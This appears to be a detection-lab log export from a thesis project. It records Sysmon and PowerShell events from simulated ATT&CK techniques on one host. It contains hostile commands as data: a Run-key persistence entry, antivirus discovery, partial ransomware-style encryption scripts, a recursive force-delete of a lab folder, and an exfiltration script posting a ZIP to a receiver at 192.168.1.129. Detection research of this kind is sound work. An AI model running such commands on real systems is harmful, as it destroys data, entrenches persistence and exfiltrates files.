2026-06-24T12:51:33.952Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P3	TEC-004	T1547.001	TEC-004 Registry Run Key modification	TEC004_RunKey_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC004_RunKey_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P3	TEC-005	T1569.002	TEC-005 Windows service creation	TEC005_Service_System7045	LT29.ait.us.es	System	{ "ServiceName": "TFM TEC005 Test Service", "ImagePath": "C:\\Windows\\System32\\cmd.exe /c echo TEC005_OK ^\u003e C:\\Users\\Public\\tec005_ok.txt", "ServiceType": "servicio de modo usuario", "StartType": "inicio por solicitud", "AccountName": "LocalSystem" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\TEC005_Service_System7045-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.900Z	P3	TEC-006	T1518.001	TEC-006 Security Software Discovery	TEC006_SecuritySoftwareDiscovery_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:16.265Z	P3	TEC-006	T1518.001	TEC-006 Security Software Discovery	TEC006_SecuritySoftwareDiscovery_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P3	TEC-006	T1518.001 context	TEC-006 Security Software Discovery process context	TEC006_SecuritySoftwareDiscovery_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC006_SecuritySoftwareDiscovery_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:53.103Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$TargetPath = "", [string]$OutputDir = "" ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($TargetPath)) { $TargetPath = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($OutputDir)) { $OutputDir = $PSScriptRoot } if (-not (Test-Path -LiteralPath $TargetPath)) { throw "TargetPath does not exist: $TargetPath" } New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null $TxtFile = Join-Path $OutputDir "lista_archivos.txt" $CsvFile = Join-Path $OutputDir "lista_archivos.csv" $files = @( Get-ChildItem -LiteralPath $TargetPath -Recurse -File -ErrorAction Stop | Where-Object { $_.Extension -ne ".aes" } | Sort-Object FullName ) $files ...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:53.660Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $_.Extension -ne ".aes" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:55.524Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	param( [string]$WorkDir = "", [string]$ListFile = "", [string]$PasswordFile = "", [int]$MaxFiles = 25 ) Set-StrictMode -Version Latest $ErrorActionPreference = "Stop" $BasePath = $env:TFM_BASEPATH if ([string]::IsNullOrWhiteSpace($BasePath)) { $BasePath = "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas" } $env:TFM_BASEPATH = $BasePath if ([string]::IsNullOrWhiteSpace($WorkDir)) { $WorkDir = Join-Path $BasePath "DUMB_LAB" } if ([string]::IsNullOrWhiteSpace($ListFile)) { $ListFile = Join-Path $PSScriptRoot "lista_archivos.csv" } if ([string]::IsNullOrWhiteSpace($PasswordFile)) { $PasswordFile = Join-Path $PSScriptRoot "password.txt" } if (-not (Test-Path -LiteralPath $WorkDir)) { throw "WorkDir does not exist: $WorkDir" } if (-not (Test-Path -LiteralPath $ListFile)) { throw "ListFile does not exist: $ListFile" } if (-not (Test-Path -LiteralPath $PasswordFile)) { Set-Content -Litera...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:55.848Z	P3	TEC-007	T1486	TEC-007 Data Encrypted for Impact	TEC007_DataEncryptedForImpact_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $_.FullName -and ($_.FullName -like "$WorkDir*") -and (Test-Path -LiteralPath $_.FullName) -and ($_.FullName -notlike "*.aes") }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC007_DataEncryptedForImpact_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:42.608Z	P3	TEC-008	T1485	TEC-008 Data Destruction	TEC008_DataDestruction_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC008_DataDestruction_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P3	TEC-009	T1048.003 context	TEC-009 receiver network context	TEC009_HTTP_Network_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Network_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P3	TEC-009	T1074.001 / T1560.001 / T1048.003 context	TEC-009 HTTP upload process context	TEC009_HTTP_Upload_Sysmon_Process_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Upload_Sysmon_Process_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P3	TEC-009	T1074.001 / T1560.001 / T1048.003 context	TEC-009 HTTP upload process context	TEC009_HTTP_Upload_Sysmon_Process_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_Upload_Sysmon_Process_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:37.369Z	P3	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 Controlled HTTP ZIP Upload	TEC009_HTTP_ZIP_Upload_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	{ $message = "" if ($null -ne $_ -and $_.PSObject.Properties.Name -contains "Message" -and $null -ne $_.Message) { $message = [string]$_.Message } $message -match "Invoke-WebRequest|application/zip|\-InFile|\-Method\s+POST|exfiltracion_v3" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC009_HTTP_ZIP_Upload_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
